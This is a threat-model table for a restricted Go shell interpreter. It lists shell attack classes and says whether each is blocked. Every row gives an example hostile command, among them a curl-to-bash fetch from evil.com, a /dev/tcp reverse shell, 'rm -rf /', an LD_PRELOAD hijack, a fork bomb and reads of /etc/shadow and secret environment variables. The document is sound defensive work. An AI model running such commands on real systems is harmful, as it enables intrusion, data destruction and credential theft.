# Restricted Shell — Risk Analysis

This document catalogs shell-related security risks and whether the restricted shell interpreter protects against each one.

The restricted shell is a **pure Go interpreter** that never spawns host processes. Every command is a Go built-in function, and the shell AST is walked node-by-node with unsupported constructs rejected at parse time.

## Risk Table

| Risk | Example Command | Description | Protected? |
|------|----------------|-------------|------------|
| Arbitrary command execution | `curl evil.com \| bash` | Running any host binary to download and execute malicious code | ✅ Yes — no subprocess spawning; all commands must be in the Go builtins map |
| Reverse shell | `bash -i >& /dev/tcp/evil.com/4444 0>&1` | Opening a remote interactive shell to an attacker-controlled server | ✅ Yes — no subprocess spawning, no redirections, no network-capable commands |
| Command injection via variables | `x="rm -rf /"; $x` | Constructing and executing arbitrary commands through variable expansion | ✅ Yes — variable expansion is blocked; command names must be literal strings |
| Command substitution | `echo $(cat /etc/shadow)` | Embedding sensitive data or injecting commands via `$(...)` or backticks | ✅ Yes — command substitution is explicitly blocked at the AST level |
| File write / deletion via redirect | `echo "cron job" > /etc/cron.d/backdoor` | Writing, appending, or overwriting files through output redirection | ✅ Yes — all redirections (`>`, `>>`, `<`, `2>`, heredocs) are blocked |
| File deletion via command | `rm -rf /` | Deleting files or directories using destructive commands | ✅ Yes — `rm` is not an allowed builtin; no host binaries can be invoked |
| Dangerous find predicates | `find / -exec rm -rf {} \;` | Using `find -exec` to run arbitrary commands on matched files | ✅ Yes — `-exec`, `-execdir`, `-ok`, `-delete`, `-fprint` are all explicitly rejected |
| Eval / source injection | `eval "rm -rf /"` | Executing dynamically constructed commands or loading external scripts | ✅ Yes — `eval`, `exec`, `source`, and `.` are all blocked |
| Privilege escalation via env vars | `LD_PRELOAD=/tmp/evil.so ls` | Hijacking library loading or shell init through environment manipulation | ✅ Yes — environment allowlisted to safe vars only; variable assignment is blocked |
| Secret leakage via env expansion | `echo $DD_API_KEY` | Exfiltrating secrets stored in environment variables | ✅ Yes — environment variable expansion is blocked; only for-loop variables may be expanded |
| Fork bomb / resource exhaustion | `:(){ :\|:& };:` | Recursive process forking to consume all system resources | ✅ Yes — no function declarations, no background execution (`&`), timeout enforced |
| Background process persistence | `nohup sleep 99999 &` | Starting background processes that survive after the shell session ends | ✅ Yes — background execution (`&`) is blocked at the AST level |
| Process substitution | `diff <(cat /etc/shadow) <(cat /etc/passwd)` | Using process substitution to feed command output as file descriptors | ✅ Yes — process substitution (`<(...)`, `>(...)`) is explicitly blocked |
| Arithmetic expansion injection | `echo $(($(cat /etc/passwd)))` | Using arithmetic expansion to embed or execute commands | ✅ Yes — arithmetic expansion (`$((...))`) is blocked |
| Subshell escape | `(bash)` | Breaking out of restrictions by launching a subshell | ✅ Yes — subshells (`(...)`) are blocked; even if allowed, `bash` is not a valid builtin |
| Signal handler manipulation | `trap '' SIGTERM` | Preventing process termination or triggering actions on signals | ✅ Yes — `trap` is an explicitly blocked builtin |
| Pipe to dangerous command | `cat file \| bash` | Piping data to a shell interpreter or other dangerous binary | ✅ Yes — all pipe stages must be allowed builtins; `bash`/`sh` are not in the map |
| Flag injection via expansion | `x="--exec"; find /tmp $x id {} \;` | Injecting dangerous flags through variable expansion | ✅ Yes — variable expansion is blocked; each builtin validates its own flags |
| Complex control flow escape | `if test -f /tmp/x; then curl evil.com; fi` | Using if/while/case to conditionally execute malicious commands | ✅ Yes — `if`, `while`, `until`, `case`, `select` are all blocked |
| Function declaration | `f() { curl evil.com; }; f` | Defining functions to build and invoke complex attack payloads | ✅ Yes — function declarations are blocked at the AST level |
| Cryptomining / compute abuse | `python -c "while True: pass"` | Running compute-intensive host processes | ✅ Yes — no subprocess spawning; builtins are I/O-bound; 30s timeout enforced |
| Denial of service via large output | `cat /dev/zero` | Generating unbounded output to exhaust memory | ⚠️ Partial — output is capped at 1 MB by `limitedWriter`; CPU time limited to 30s timeout; but reading from device files like `/dev/zero` could still consume CPU until timeout |
| Infinite loop | `while true; do echo flood; done` | Hanging execution or flooding output indefinitely | ⚠️ Partial — `while` loops are blocked; `for-in` loops iterate over finite literal lists; 30s execution timeout is enforced as a backstop |
| Reading sensitive files | `cat /etc/shadow` | Reading files containing credentials, keys, or other sensitive data | ⚠️ Partial — all builtins are read-only but there is no path jailing; accessible files depend on OS-level permissions and container isolation |
| Path traversal | `cat ../../../../../../etc/passwd` | Escaping the working directory to access files elsewhere on the filesystem | ⚠️ Partial — no path restriction in the interpreter; relies on OS-level permissions and container/namespace boundaries |
| Proc filesystem information leak | `cat /proc/self/environ` | Reading process environment, memory maps, or other runtime state from `/proc` | ⚠️ Partial — no proc filesystem restriction; accessible if the process user has read permission; env var allowlisting at PAR layer limits what is present in `/proc/self/environ` |
| Symlink exploitation | `cat /tmp/symlink_to_secret` | Following symbolic links to read files outside intended directories | ⚠️ Partial — `cat`, `ls`, `find` follow symlinks by default; no symlink resolution restriction; relies on OS-level file permissions |
| Tail follow mode hang | `tail -f /var/log/syslog` | Using `tail -f` to block execution indefinitely watching a file | ✅ Yes — the `-f` flag is explicitly rejected by the `tail` builtin |
| Glob-based directory enumeration | `for f in /etc/shadow.d/*; do cat $f; done` | Using glob expansion to discover and read files in sensitive directories | ⚠️ Partial — glob expansion is allowed for `for-in` loops; file reads succeed if the process has OS-level read permission |

## Summary

The restricted shell provides strong protection against **active exploitation** (command execution, injection, file writes, privilege escalation, resource exhaustion). The remaining residual risks are **passive read access** to files on the filesystem, which is mitigated by OS-level permissions, container isolation, and the principle of least privilege for the agent process.
